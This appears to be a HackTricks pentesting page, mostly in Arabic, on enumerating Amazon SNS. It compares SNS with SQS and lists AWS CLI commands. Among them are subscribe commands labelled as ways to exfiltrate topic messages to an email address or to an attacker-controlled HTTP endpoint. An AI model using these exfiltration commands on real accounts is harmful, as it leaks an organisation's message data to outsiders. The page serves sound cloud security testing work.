# AWS - SNS Enum

{{#include ../../../banners/hacktricks-training.md}}

## SNS

Amazon Simple Notification Service (Amazon SNS) in وصفها كـ **خدمة رسائل مُدارة بالكامل**. تدعم كل من **التطبيق إلى التطبيق** (A2A) و **التطبيق إلى الشخص** (A2P) أنواع الاتصال.

المميزات الرئيسية لتواصل A2A تشمل **آليات النشر/الاشتراك (pub/sub)**. هذه الآليات تقدم **مواضيع**، وهي ضرورية لتمكين **الرسائل المعتمدة على الدفع، ذات الكثافة العالية، من العديد إلى العديد**. هذه الميزة مفيدة للغاية في السيناريوهات التي تتضمن أنظمة موزعة، خدمات صغيرة، وهياكل خالية من الخادم مدفوعة بالحدث. من خلال الاستفادة من هذه المواضيع، يمكن لأنظمة الناشرين توزيع الرسائل بكفاءة إلى **مجموعة واسعة من أنظمة المشتركين**، مما يسهل نمط الرسائل المتفرعة.

### **Difference with SQS**

**SQS** هي خدمة **مبنية على الطوابير** تسمح بالتواصل من نقطة إلى نقطة، مما يضمن معالجة الرسائل بواسطة **مستهلك واحد**. تقدم **تسليم على الأقل مرة واحدة**، تدعم الطوابير القياسية و FIFO، وتسمح بالاحتفاظ بالرسائل لإعادة المحاولة والمعالجة المتأخرة.\
من ناحية أخرى، **SNS** هي خدمة **مبنية على النشر/الاشتراك**، مما يمكّن **التواصل من واحد إلى العديد** من خلال بث الرسائل إلى **عدة مشتركين** في وقت واحد. تدعم **نقاط الاشتراك المختلفة مثل البريد الإلكتروني، SMS، وظائف Lambda، و HTTP/HTTPS**، وتوفر آليات تصفية لتسليم الرسائل المستهدفة.\
بينما تمكّن كلا الخدمتين من فصل المكونات في الأنظمة الموزعة، تركز SQS على التواصل القائم على الطوابير، بينما تركز SNS على أنماط التواصل المدفوعة بالحدث والمتفرعة.

### **Enumeration**
```bash
# Get topics & subscriptions
aws sns list-topics
aws sns list-subscriptions
aws sns list-subscriptions-by-topic --topic-arn <arn>

# Check privescs & post-exploitation
aws sns publish --region <region> \
--topic-arn "arn:aws:sns:us-west-2:123456789012:my-topic" \
--message file://message.txt

# Exfiltrate through email
## You will receive an email to confirm the subscription
aws sns subscribe --region <region> \
--topic-arn arn:aws:sns:us-west-2:123456789012:my-topic \
--protocol email \
--notification-endpoint my-email@example.com

# Exfiltrate through web server
## You will receive an initial request with a URL in the field "SubscribeURL"
## that you need to access to confirm the subscription
aws sns subscribe --region <region>\
--protocol http \
--notification-endpoint http://<attacker>/ \
--topic-arn <arn>
```
> [!CAUTION]
> Kumbuka kwamba ikiwa **mada ni ya aina ya FIFO**, ni wanachama pekee wanaotumia itifaki **SQS** wanaweza kutumika (HTTP au HTTPS haiwezi kutumika).
>
> Pia, hata kama `--topic-arn` ina eneo hakikisha unataja eneo sahihi katika **`--region`** au utapata kosa ambalo linaonekana kuashiria kwamba huna ufikiaji lakini tatizo ni eneo.

#### Unauthenticated Access

{{#ref}}
../aws-unauthenticated-enum-access/aws-sns-unauthenticated-enum.md
{{#endref}}

#### Privilege Escalation

{{#ref}}
../aws-privilege-escalation/aws-sns-privesc.md
{{#endref}}

#### Post Exploitation

{{#ref}}
../aws-post-exploitation/aws-sns-post-exploitation.md
{{#endref}}

#### Persistence

{{#ref}}
../aws-persistence/aws-sns-persistence.md
{{#endref}}

## References

- [https://aws.amazon.com/about-aws/whats-new/2022/01/amazon-sns-attribute-based-access-controls/](https://aws.amazon.com/about-aws/whats-new/2022/01/amazon-sns-attribute-based-access-controls/)

{{#include ../../../banners/hacktricks-training.md}}
